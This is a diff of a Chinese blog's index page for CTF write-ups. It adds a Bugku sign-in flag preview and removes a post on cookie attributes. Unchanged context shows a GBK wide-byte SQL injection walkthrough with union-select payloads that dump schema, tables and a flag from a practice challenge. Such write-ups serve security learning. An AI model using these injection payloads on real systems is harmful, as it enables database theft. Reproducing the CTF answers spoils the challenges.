@@ -98,6 +98,26 @@
         <div class="content-wrapper">
           <div id="content" class="content"><section id="posts" class="posts"><article class="post">
     <header class="post-header">
+      <h1 class="post-title"><a class="post-link" href="/2019/10/27/Bugku-Misc/">Bugku-Misc</a>
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2019-10-27
+        </span><span class="post-category">
+            <a href="/categories/%E6%9D%82%E9%A1%B9/">杂项</a>
+            <a href="/categories/%E6%9D%82%E9%A1%B9/WP/">WP</a>
+            </span>
+        </div>
+    </header>
+
+    <div class="post-content"><h3 id="签到题"><a href="#签到题" class="headerlink" title="#签到题"></a>#签到题</h3><p>扫描微信二维码加关注后可得<br>flag{BugKu-Sec-pwn!}</p>
+          <div class="read-more">
+            <a href="/2019/10/27/Bugku-Misc/" class="read-more-link">Read more..</a>
+          </div>
+        </div></article>
+      <article class="post">
+    <header class="post-header">
       <h1 class="post-title"><a class="post-link" href="/2019/10/27/Bootstrap/">Bootstrap</a>
         </h1>
 
@@ -277,26 +297,6 @@
 <h3 id="步骤"><a href="#步骤" class="headerlink" title="#步骤"></a>#步骤</h3><p>题目来自NJUPT平台 <a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a><br>1.<code>id=2</code> 得到Tips：<code>gbk_sql_injection</code>宽字节注入<br>2.<code>id=%df%27 or 1 = 1%23 your sql:select id,title from news where id = ‘運’ or 1 = 1#’</code><br>3.<br><code>id=%df%27 union select 1,database() from news%23</code>爆出库名 <code>sae-chinalover</code>/<br><code>id=%df%27 and 1=2 union select 1,SCHEMA_NAME from information_schema.SCHEMATA limit 1,1--+%23</code>也可以 然后<code>sae-chinalover</code>十六进制转换为 <code>0x7361652D6368696E616C6F766572</code><br>4.<code>id=%df%27 and 1=2 union select 1,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x7361652D6368696E616C6F766572%23</code><br>爆出表名 <code>ctf</code>,<code>ctf2</code>,<code>ctf3</code>,<code>ctf4</code>,<code>news</code><br>十六进制转换分别为<code>0x637466</code>，<code>0x63746632</code>，<code>0x63746633</code>，<code>0x63746634</code>，<code>0x6E657773</code><br>5.<code>id=%df%27 and 1=2 union select 1,group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x637466%23/0x63746632/0x63746633/0x63746634/0x6E657773</code>最后在表<code>ctf4</code>中得到<code>flag</code>字段<br>6.<br><code>id=%df%27 and 1=2 union select 1,group_concate(flag) from ctf4</code>得到Flag：nctf{gbk_3sqli}</p>
           <div class="read-more">
             <a href="/2019/10/23/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%89%8B%E6%B3%A8/" class="read-more-link">Read more..</a>
-          </div>
-        </div></article>
-      <article class="post">
-    <header class="post-header">
-      <h1 class="post-title"><a class="post-link" href="/2019/10/23/Web%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/">Web前端安全</a>
-        </h1>
-
-      <div class="post-meta">
-        <span class="post-time">
-          2019-10-23
-        </span><span class="post-category">
-            <a href="/categories/Web/">Web</a>
-            </span>
-        </div>
-    </header>
-
-    <div class="post-content"><h3 id="cookie"><a href="#cookie" class="headerlink" title="#cookie"></a>#cookie</h3><p>-定义：存储在浏览器中的纯文本<br>-JS中访问Cookie-document cookie 只能获取非httpOnly<br>-属性选项：expires，domain，path，secure，HttpOnly<br>-domain，path俩个属性决定什么时候cookie被浏览器发送出去<br>-发生跨域ajax请求 即使请求URL的域名和路径都满足cookie的domain和path 默认情况下cookie也不会自动被添加到http头部 –可以是本身/父项<br>-secure设置 保证网页是Http协议的 HttpOnly不能通过JS代码区设置 只能通过服务器来设置:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.修改cookie-重新赋值，path&#x2F;domain与旧保持一样</span><br><span class="line">2.删除cookie-重新赋值，expires设置成过去的时间</span><br><span class="line">3.编码-escape</span><br></pre></td></tr></table></figure>
-          <div class="read-more">
-            <a href="/2019/10/23/Web%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/" class="read-more-link">Read more..</a>
           </div>
         </div></article>
       <nav class="pagination"><a class="prev" href="/page/3/">
